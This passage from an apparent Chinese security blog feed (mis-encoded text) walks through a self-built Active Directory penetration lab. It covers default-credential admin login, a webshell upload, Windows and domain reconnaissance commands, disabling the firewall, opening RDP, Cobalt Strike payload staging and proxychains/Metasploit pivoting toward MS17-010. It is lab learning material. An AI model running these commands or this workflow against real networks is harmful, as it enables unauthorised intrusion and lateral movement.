href="https://threezh1.com/2019/04/16/Upload-labs-Writeup/#Pass-09">https://threezh1.com/2019/04/16/Upload-labs-Writeup/#Pass-09</a></p><p><a href="https://www.freebuf.com/articles/web/265245.html">https://www.freebuf.com/articles/web/265245.html</a></p><p><a href="https://www.mi1k7ea.com/2019/10/05/upload-labs-WriteUp/">https://www.mi1k7ea.com/2019/10/05/upload-labs-WriteUp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;upload-labs&quot;&gt;&lt;a href=&quot;#upload-labs&quot; class=&quot;headerlink&quot; title=&quot;upload-labs&quot;&gt;&lt;/a&gt;upload-labs&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/lcdm12</summary>
      
    
    
    
    
    <category term="é¶åœº" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>FreebufåŸŸæ¸—é€é¶åœº</title>
    <link href="http://example.com/2021/09/02/Freebuf%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2021/09/02/Freebuf%E9%9D%B6%E5%9C%BA/</id>
    <published>2021-09-02T04:13:45.000Z</published>
    <updated>2021-09-22T02:05:18.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Freebuf-åŸŸæ¸—é€é¶åœº"><a href="#Freebuf-åŸŸæ¸—é€é¶åœº" class="headerlink" title="Freebuf åŸŸæ¸—é€é¶åœº"></a>Freebuf åŸŸæ¸—é€é¶åœº</h1><h2 id="æ­å»º"><a href="#æ­å»º" class="headerlink" title="æ­å»º"></a>æ­å»º</h2><p><a href="https://www.freebuf.com/articles/web/265049.html">https://www.freebuf.com/articles/web/265049.html</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/%E5%9F%9F%E6%A3%AE%E6%9E%97.png" alt="åŸŸæ£®æ—"></p><p>æ­å»ºé¶åœºå°±æ˜¯ä¸€èˆ¬æ­¥éª¤</p><p>éœ€è¦æ³¨æ„çš„æ­¥éª¤</p><ol><li><p>ä¿®æ”¹çˆ¶åŸŸçš„DNSè®¾ç½®</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802113055188.png" alt="image-20210802113055188"></p></li><li><p>è´¢åŠ¡åŸŸæ˜¯ä¸€ä¸ªå•ç‹¬çš„åŸŸç¯å¢ƒï¼Œè´¢åŠ¡æ ¸å¿ƒç³»ç»Ÿå±äºè´¢åŠ¡åŸŸ</p></li><li><p>webæœåŠ¡å™¨ç›´æ¥æ‹¿çš„çº¢æ—¥æ”¹çš„ï¼ŒçœŸæ–¹ä¾¿</p></li></ol><p>ç»è¿‡åæœŸçš„æ”»å‡»ï¼Œå‘ç°å­åŸŸå’Œçˆ¶åŸŸä¹‹é—´å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæœªæ‰¾åˆ°åŸå› ï¼å®‰è£…é…ç½®æ—¶åªéœ€è¦æ·»åŠ å¥½ç½‘å¡ï¼Œè‡ªå·±å¢åŠ ç”¨æˆ·å³å¯</p><blockquote><p>è™šæ‹Ÿæœºæ˜¯çœŸçš„å¡â€¦â€¦â€¦â€¦ä¸¤å°ç”µè„‘ä¸€èµ·å¹²æœ€èˆ’æœ</p></blockquote><h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><h3 id="å¤–ç½‘æ”»å‡»"><a href="#å¤–ç½‘æ”»å‡»" class="headerlink" title="å¤–ç½‘æ”»å‡»"></a>å¤–ç½‘æ”»å‡»</h3><blockquote><p>ç½‘ç«™æ¼æ´ä¸»è¦å°±æ˜¯å¸¸è§çš„ï¼šé€»è¾‘æ¼æ´ï¼Œå¼±å£ä»¤ï¼Œä¿¡æ¯æ³„éœ²ï¼ŒSQLæ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œæ–‡ä»¶åŒ…å«ï¼ŒXSSâ€¦â€¦</p></blockquote><p>æ‹¿åˆ°ç½‘ç«™ï¼Œé¦–å…ˆçœ‹ç™»å½•ç‚¹ï¼Œæ‰¾ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ç®¡ç†å‘˜ç™»å½•å…¥å£ï¼ˆå¯¹äºå·²çŸ¥çš„CMSå¯ä»¥ç›´æ¥ä¸Šç½‘æŸ¥ï¼‰ï¼Œæ‰«æç›®å½•çš„æ—¶å€™éœ€è¦æ§åˆ¶é¢‘ç‡ä¸ç„¶å®¹æ˜“è¢«å°IPï¼Œå¯ä»¥æ‰¾cmsçš„å†å²æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172029664.png" alt="image-20210802172029664"></p><p>ç›´æ¥æ‰¾åˆ°åå°ç™»å½•ç‚¹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802171633017.png" alt="image-20210802171633017"></p><p>è¿™é‡Œç§æƒ…å†µå°±å…ˆæ‰¾ä¸€ä¸‹ç½‘ç«™æ˜¯å¦æœ‰é»˜è®¤è´¦æˆ·å¯†ç ï¼Œä¸‡èƒ½å¯†ç ï¼ŒSQLæ³¨å…¥ç­‰ï¼Œä¸Šé¢æœ‰é»˜è®¤å¯†ç æ‰€ä»¥ç›´æ¥å°è¯•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172221644.png" alt="image-20210802172221644"></p><p>ç™»å½•æˆåŠŸï¼Œæ‰¾åˆ°å¯ä»¥è·å–shellçš„ç‚¹ï¼Œå‰å°æ¨¡æ¿å¤„æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ç›´æ¥å†™å…¥PHPçš„ç‚¹ï¼Œä¸Šä¼ æœ¨é©¬ï¼Œä¸‹ä¸€æ­¥éœ€è¦æ‰¾åˆ°é©¬çš„ä½ç½®ï¼ŒæŸ¥æ‰¾ç½‘ä¸ŠCMSçš„ç½‘ç«™ç›®å½•ç„¶åæ‰¾å‡ºæ–‡ä»¶ä½ç½®ï¼ˆæ¨èï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172701737.png" alt="image-20210802172701737"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173539349.png" alt="image-20210802173539349"></p><p>è¿æ¥æœ¨é©¬ï¼Œå¼€å§‹å†…ç½‘æ¸—é€</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173703124.png" alt="image-20210802173703124"></p><h3 id="å†…ç½‘æ”»å‡»"><a href="#å†…ç½‘æ”»å‡»" class="headerlink" title="å†…ç½‘æ”»å‡»"></a>å†…ç½‘æ”»å‡»</h3><h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><blockquote><p>ç¬¬ä¸€æ¬¡å†™ï¼Œå„ç§ä¿¡æ¯æ”¶é›†çš„å‘½ä»¤éƒ½å†™ä¸€ä¸‹</p></blockquote><h5 id="æœ¬æœºä¿¡æ¯æ”¶é›†"><a href="#æœ¬æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æ”¶é›†"></a>æœ¬æœºä¿¡æ¯æ”¶é›†</h5><ol><li><p>è·å–IPä¿¡æ¯ï¼ˆæ˜¯å¦æœ‰å†…ç½‘IPï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174344376.png" alt="image-20210802174344376"></p></li><li><p>æŸ¥çœ‹æœ¬æœºæƒé™ï¼ˆä¸ºäº†åæœŸææƒï¼‰ï¼š<code>whoami</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173929555.png" alt="image-20210802173929555"></p></li><li><p>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼ˆæŸ¥çœ‹æ˜¯å¦æœ‰åŸŸç¯å¢ƒï¼Œè·å–è¡¥ä¸ä¿¡æ¯ï¼Œç³»ç»Ÿç‰ˆæœ¬ç­‰ä¿¡æ¯ï¼‰ï¼š<code>systeminfo</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174020113.png" alt="image-20210802174020113"></p><blockquote><p>å‘ç°æœ‰åŸŸå°±å¯ä»¥è¿›ä¸€æ­¥æ”¶é›†å†…ç½‘ä¿¡æ¯äº†ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªæœºå™¨å°±ç›´æ¥ææƒç„¶åå°±åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„äº‹æƒ…äº†</p></blockquote></li><li><p>æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£ï¼ˆä¸»è¦æ³¨æ„è¿œç¨‹è¿æ¥ç«¯å£ï¼ˆ22   3389ï¼‰å’Œå¯ä»¥åˆ©ç”¨çš„æ¼æ´çš„ç«¯å£ï¼‰ï¼š<code>netstat -ano</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802180609270.png" alt="image-20210802180609270"></p></li><li><p>ç¡®å®šå½“å‰æœåŠ¡å™¨æ˜¯å¦æœ‰æ€è½¯ï¼ˆåæœŸä¸ºå·¥å…·åšå…æ€ï¼‰ï¼š<code>tasklist</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174237882.png" alt="image-20210802174237882"></p></li><li><p>è·å–å½“å‰å¼€å¯çš„æœåŠ¡ï¼ˆå¯èƒ½æœ‰æœåŠ¡èƒ½å¸®åŠ©ææƒï¼‰ï¼š<code>wmic service list brief</code>         <code>net start</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802175159585.png" alt="image-20210802175159585"></p></li><li><p>æŸ¥çœ‹ç³»ç»Ÿå¼€æœºæ—¶é—´ï¼š<code>net statistics workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802175707265.png" alt="image-20210802175707265"></p></li><li><p>æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯ï¼š<code>wmic startup get command,caption</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803095350375.png" alt="image-20210803095350375"></p></li><li><p>æŸ¥è¯¢æœ¬æœºä¸Šç”¨æˆ·åˆ—è¡¨ï¼ˆæ²¡æœ‰åŒ…å«åŸŸç”¨æˆ·ï¼‰ï¼š<code>net user</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803095935390.png" alt="image-20210803095935390"></p></li><li><p>è·å–æœ¬åœ°ç®¡ç†å‘˜ï¼ˆåŒ…å«åŸŸç®¡ç†å‘˜ï¼‰ä¿¡æ¯ï¼š<code>net localgroup administrators</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100235551.png" alt="image-20210803100235551"></p></li><li><p>æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨ï¼š<code>net share</code>    <code>wmic share get name,path,status</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100551173.png" alt="image-20210803100551173"></p><blockquote><p>å¯ä»¥è¿›è¡ŒIPCç­‰å†…ç½‘æ“ä½œ</p></blockquote></li><li><p>æŸ¥è¯¢è·¯ç”±è¡¨åŠarpç¼“å­˜è¡¨ï¼š<code>route print</code>  <code>arp -a</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100836885.png" alt="image-20210803100836885"></p></li><li><p>å…³é—­é˜²ç«å¢™ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ï¼š<code>netsh advfirewall set allprofiles state off</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101029730.png" alt="image-20210803101029730"></p></li><li><p>æŸ¥çœ‹é˜²ç«å¢™é…ç½®ï¼š<code>netsh firewall show config</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101228040.png" alt="image-20210803101228040"></p></li><li><p>å¼€å¯è¿œç¨‹ç«¯å£ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ï¼š<code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101516401.png" alt="image-20210803101516401"></p></li><li><p>æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£ï¼š<code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></p></li></ol><blockquote><p>å‰æœŸçš„æœ¬åœ°ä¿¡æ¯æ”¶é›†åŒ…å«è®¡ç®—æœºç³»ç»Ÿç‰ˆæœ¬ï¼Œç½‘å¡è·¯ç”±ï¼Œé˜²ç«å¢™ä¿¡æ¯ï¼Œè¡¥ä¸ï¼ŒåŸŸï¼ŒARPç¼“å­˜ï¼Œè·¯ç”±ï¼Œç”¨æˆ·åˆ—è¡¨ï¼Œç®¡ç†å‘˜æƒé™ç”¨æˆ·ï¼Œä¹Ÿéœ€è¦æ³¨æ„ç”µè„‘ä¸Šå­˜æœ‰çš„æ•æ„Ÿä¿¡æ¯çš„æ–‡ä»¶</p><p>ä¹Ÿæœ‰è‡ªåŠ¨ä¿¡æ¯æ”¶é›†å·¥å…·æ‡’ğŸ•å¯ä»¥è€ƒè™‘ä¸€ä¸‹</p></blockquote><h5 id="åŸŸä¿¡æ¯æ”¶é›†"><a href="#åŸŸä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸä¿¡æ¯æ”¶é›†"></a>åŸŸä¿¡æ¯æ”¶é›†</h5><h6 id="åŸºæœ¬ä¿¡æ¯æ”¶é›†"><a href="#åŸºæœ¬ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸºæœ¬ä¿¡æ¯æ”¶é›†"></a><strong>åŸºæœ¬ä¿¡æ¯æ”¶é›†</strong></h6><blockquote><p>ç”±ä¸Šé¢çš„æœ¬åœ°ä¿¡æ¯æ”¶é›†å¾—çŸ¥å­˜åœ¨åŸŸï¼Œæ‰€ä»¥å°±ç»§ç»­è¿›è¡ŒåŸŸæ¸—é€</p></blockquote><ol><li><p>æŸ¥çœ‹å½“å‰æƒé™è·å–åŸŸSIDï¼ˆSIDå¯¹åŸŸæ¸—é€æœ‰å¸®åŠ©ï¼‰ï¼š<code>whoami /all</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102458768.png" alt="image-20210803102458768"></p></li><li><p>æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯ï¼š<code>net config workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102759673.png" alt="image-20210803102759673"></p></li><li><p>æŸ¥çœ‹å½“å‰æ‰€å±åŸŸï¼ˆåŸŸæ§æœåŠ¡å™¨ä¼šåŒæ—¶ä½œä¸ºæ—¶é—´æœåŠ¡å™¨ä½¿ç”¨ï¼‰ï¼š<code>net time /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102949200.png" alt="image-20210803102949200"></p></li><li><p>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</p><ul><li><p>åˆ©ç”¨<code>nbtscan</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803103742640.png" alt="image-20210803103742640"></p><blockquote><p>å‘ç°ä¸‰ä¸ªåŸŸæ§</p></blockquote></li><li><p>åˆ©ç”¨ICMPåè®®æ¢æµ‹ï¼š<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803104932946.png" alt="image-20210803104932946"></p></li><li><p>ARPæ‰«æå†…ç½‘</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803104457305.png" alt="image-20210803104457305"></p><blockquote><p>æ”¶é›†åˆ°çš„å­˜æ´»ä¸»æœºä¿¡æ¯ï¼š</p><p>10.10.3.5    LCDM123\MAINYU         SHARING DC</p><p>10.10.3.6    XIAOYU\ZIYU           SHARING DC</p><p>10.10.3.7    LCDM123\FUZHU          SHARING DC</p><p>10.10.3.128   XIAOYU\WEB           SHARING</p><p>10.10.3.16</p></blockquote></li></ul></li><li><p>ä¸»æœºç«¯å£ä¿¡æ¯æ”¶é›†</p><ul><li><p>telnetç«¯å£ä¿¡æ¯æ”¶é›†ï¼š<code>telnet ip port</code></p><blockquote><p>å¸¸è§ç«¯å£ï¼š22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432,53,161,137,139</p><p>è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒæ…¢ï¼Œä½†æ˜¯å‡†ç¡®</p></blockquote></li><li><p>Sæ‰«æå™¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803110805230.png" alt="image-20210803110805230"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803110815940.png" alt="image-20210803110815940"></p><blockquote><p>æ‰«æç»“æœä¸æ˜¯å¾ˆé½å…¨</p></blockquote></li><li><p>nmapï¼ˆè¿™ä¸ªæ­å»ºä»£ç†å†æ‰«æå†…ç½‘æ¯”è¾ƒæ–¹ä¾¿ï¼‰</p></li><li><p>ä½¿ç”¨Nishang</p></li><li><p>ä½¿ç”¨MSF</p></li><li><p>â€¦â€¦â€¦â€¦</p></li></ul></li><li><p>è·å–ç«¯å£çš„Bannerä¿¡æ¯ï¼ˆå®¢æˆ·ç«¯è¿æ¥å·¥å…·ï¼ŒNCï¼‰</p></li></ol><h6 id="åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†"><a href="#åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†"></a><strong>åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†</strong></h6><ol><li><p>æŸ¥è¯¢åŸŸï¼š<code>net view /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112637819.png" alt="image-20210803112637819"></p></li><li><p>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœºï¼š<code>net view /domain:XIAOYU</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112659327.png" alt="image-20210803112659327"></p></li><li><p>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨ï¼š<code>net group /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112758051.png" alt="image-20210803112758051"></p><blockquote><p>é»˜è®¤æƒ…å†µä¸‹Domain Adminså’ŒEnterprise Adminså¯¹åŸŸå†…æ‰€æœ‰åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒé™</p></blockquote></li><li><p>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·åˆ—è¡¨ï¼š<code>net group &quot;domain computers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113031102.png" alt="image-20210803113031102"></p></li><li><p>åŸŸå¯†ç ç­–ç•¥ï¼š<code>net accounts /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113147707.png" alt="image-20210803113147707"></p></li><li><p>è·å–åŸŸä¿¡ä»»ä¿¡æ¯ï¼š<code>nltest /domain_trusts</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113417757.png" alt="image-20210803113417757"></p><blockquote><p>win7 è¿™ä¸ªå‘½ä»¤ä¸è¡Œï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p></blockquote></li><li><p>æŸ¥æ‰¾åŸŸæ§ï¼ˆéœ€è¦å±äºåŸŸå†…çš„ç”¨æˆ·è¿è¡Œï¼‰ï¼š<code>net time /domain</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803114605145.png" alt="image-20210803114605145"></p></li><li><p>æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„ï¼š<code>net group &quot;domain controllers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113654103.png" alt="image-20210803113654103"></p></li><li><p>åŸŸå†…ç”¨æˆ·åˆ—è¡¨ï¼š<code>net user /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803114713304.png" alt="image-20210803114713304"></p></li><li><p>è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼š<code>wmic useraccount get /all</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823124332827.png" alt="image-20210823124332827"></p></li><li><p>æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·ï¼š<code>dsquery user</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823124425459.png" alt="image-20210823124425459"></p><blockquote><p>æ— æ³•å…è®¸ï¼Ÿï¼Ÿï¼Ÿ</p></blockquote></li><li><p>æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼š<code>net localgroup administrators</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803115511194.png" alt="image-20210803115511194"></p></li><li><p>æŸ¥è¯¢åŸŸç®¡ç†å‘˜ï¼š<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803140643801.png" alt="image-20210803140643801"></p></li></ol><h6 id="æ”¶é›†å®šä½åŸŸç®¡ç†"><a href="#æ”¶é›†å®šä½åŸŸç®¡ç†" class="headerlink" title="æ”¶é›†å®šä½åŸŸç®¡ç†"></a><strong>æ”¶é›†å®šä½åŸŸç®¡ç†</strong></h6><ol><li><p>ä½¿ç”¨<code>psloggedon</code>æŸ¥è¯¢è°ç™»å½•äº†è¿œç¨‹è®¡ç®—æœºèµ„æº</p></li><li><p>ä½¿ç”¨<code>PVEFindADUser</code>æŸ¥è¯¢æŸ¥è¯¢æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•ä½ç½®ï¼Œæšä¸¾åŸŸç”¨æˆ·ï¼ŒæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ï¼Œé€šè¿‡RDPç™»å½•çš„ç”¨æˆ·ï¼Œç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803143758539.png" alt="image-20210803143758539"></p><blockquote><p>æœªæŸ¥è¯¢åˆ°ä»»ä½•æœ‰ç”¨çš„ä¸œè¥¿</p></blockquote></li><li><p>ä½¿ç”¨<code>netview</code>æŸ¥è¯¢ï¼ˆå¤§éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803142542668.png" alt="image-20210803142542668"></p><blockquote><p>å­åŸŸæ§ä¸Š å‘ç°äº†äºŒçº§ç½‘ç»œï¼š10.10.21.5</p></blockquote></li><li><p>ä½¿ç”¨<code>powerView</code>è„šæœ¬ï¼ˆå¸¸ç”¨ï¼‰</p><p><code>powerView.ps1</code>æ˜¯ä¸€æ¬¾ä¾èµ–powershellå’Œwmiå¯¹å†…ç½‘è¿›è¡ŒæŸ¥è¯¢çš„å¸¸ç”¨æ¸—é€æµ‹è¯•è„šæœ¬ï¼Œé›†æˆåœ¨powersploitå·¥å…·åŒ…ä¸­ï¼Œæ˜¯ä¸€ä¸ªæ”¶é›†åŸŸä¿¡æ¯å¾ˆå¥½ç”¨çš„è„šæœ¬ã€‚</p></li></ol><h6 id="æŸ¥æ‰¾åŸŸæ§çš„ç”¨æˆ·ä¼šè¯"><a href="#æŸ¥æ‰¾åŸŸæ§çš„ç”¨æˆ·ä¼šè¯" class="headerlink" title="æŸ¥æ‰¾åŸŸæ§çš„ç”¨æˆ·ä¼šè¯"></a><strong>æŸ¥æ‰¾åŸŸæ§çš„ç”¨æˆ·ä¼šè¯</strong></h6><p>å†…ç½‘æ¸—é€ä¸­ï¼Œé€šå¸¸å›´ç»•ç€æ”¶é›†æ˜æ–‡å‡­æ®æˆ–è€…é€šè¿‡mimikatzææƒç­‰æ–¹æ³•ï¼Œå¦‚æœå†…ç½‘ç¯å¢ƒéå¸¸çš„å¤æ‚ï¼Œæˆ‘ä»¬æ— æ³•ç«‹å³åœ¨ç”¨æœ‰æƒé™çš„ç³»ç»Ÿä¸­è·å¾—åŸŸç®¡ç†å‘˜è¿›ç¨‹ï¼Œé‚£ä¹ˆé€šå¸¸å¯ä»¥é‡‡ç”¨çš„æ–¹æ³•æ˜¯ï¼šåœ¨è·³æ¿æœºä¹‹é—´è·³è½¬ï¼Œç›´è‡³è·å¾—åŸŸç®¡ç†å‘˜æƒé™ï¼ŒåŒæ—¶è¿›è¡Œä¸€äº›åˆ†æå·¥å…·ï¼Œæ‰¾åˆ°æ¸—é€æµ‹è¯•çš„è·¯å¾„ã€‚</p><ol><li><p>æœ¬æœºæ£€æµ‹ï¼š<code>tasklist -v</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803144742505.png" alt="image-20210803144742505"></p></li><li><p>æŸ¥è¯¢åŸŸæ§åˆ¶å™¨å’ŒåŸŸç®¡ç†å‘˜åˆ—è¡¨ï¼š</p><p><code>net group &quot;Domain Controllers&quot; /domain</code> </p><p><code>net group &quot;Domain Admins&quot; /domain</code></p></li><li><p>æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸçš„ä¼šè¯åˆ—è¡¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803145339427.png" alt="image-20210803145339427"></p></li></ol><blockquote><p>æ”¶é›†åˆ°çš„ä¿¡æ¯å¾ˆå¤šå¹¶ä¸”æ¯”è¾ƒæ‚ä¹±ï¼Œæ”¶é›†å®Œæˆä¹‹åéœ€è¦å•ç‹¬æ•´ç†ä¸€ä¸‹ï¼Œå»ºè®®åé¢å†™ä¸€ä¸ªæ¨¡æ¿æ–¹ä¾¿æ•´ç†ä¿¡æ¯</p><p>å†…ç½‘ç¯å¢ƒå­˜åœ¨åŸŸå¹¶ä¸”å­˜åœ¨å¤šçº§å†…ç½‘ï¼Œå¹¶ä¸”å¯ä»¥å¤§è‡´ç”»å‡ºå†…ç½‘ä¸€éƒ¨åˆ†æ‹“æ‰‘</p><p>ä¿¡æ¯æ”¶é›†çš„æ·±åº¦å’Œå¹¿åº¦å†³å®šäº†åæœŸçš„å‘å±•ï¼Œæ”¶é›†åˆ°çš„ä¿¡æ¯çš„æ•´ç†ä¹Ÿæ˜¯ååˆ†é‡è¦çš„ã€‚</p></blockquote><h4 id="CSæ¸—é€"><a href="#CSæ¸—é€" class="headerlink" title="CSæ¸—é€"></a>CSæ¸—é€</h4><p>ä¸Šçº¿CSçš„å‡†å¤‡å·¥ä½œ</p><ol><li><p>å»ºç«‹ç›‘å¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130044870.png" alt="image-20210823130044870"></p></li><li><p>ç”Ÿæˆpayload</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130240253.png" alt="image-20210823130240253"></p></li><li><p>ä¸Šä¼ exeï¼ŒCSä¸Šçº¿</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130457523.png" alt="image-20210823130457523"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130508183.png" alt="image-20210823130508183"></p></li></ol><p>åˆ©ç”¨CSææƒ</p><blockquote><p>æ¨èä¸¤ä¸ªCSçš„æ’ä»¶</p><p><a href="https://github.com/z1un/Z1-AggressorScripts">https://github.com/z1un/Z1-AggressorScripts</a></p><p><a href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823142539507.png" alt="image-20210823142539507"></p><blockquote><p>æˆåŠŸè·å–åˆ°äº†webæœåŠ¡å™¨çš„ç®¡ç†å‘˜æƒé™</p></blockquote><p>ä¸‹ä¸€æ­¥å‡†å¤‡è·å–å­åŸŸæ§çš„æƒé™ï¼Œå…ˆæ­å»ºéš§é“ï¼Œç„¶ååˆ©ç”¨webæœåŠ¡å™¨å½“ä½œè·³æ¿æœºæ”»å‡»å­åŸŸæ§</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144034038.png" alt="image-20210823144034038"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144020628.png" alt="image-20210823144020628"></p><p>æ£€æµ‹éš§é“</p><p>é…ç½®<code>sudo vim /etc/proxychains.conf</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144438818.png" alt="image-20210823144438818"></p><blockquote><p>éš§é“æ­å»ºæˆåŠŸ</p></blockquote><p>åˆ©ç”¨ä»£ç†æ‰“å¼€MSFï¼š<code>proxychains msfconsole</code> ç„¶åç¡®è®¤æ˜¯å¦æœ‰MS17-010æ¼æ´</p><blockquote><p>ä¹Ÿå¯ä»¥è¿›å»åè¿è¡Œ</p><p>setg Proxies socks5:192.168.1.15:6000</p><p>setg ReverseAllowProxy true</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823145340538.png" 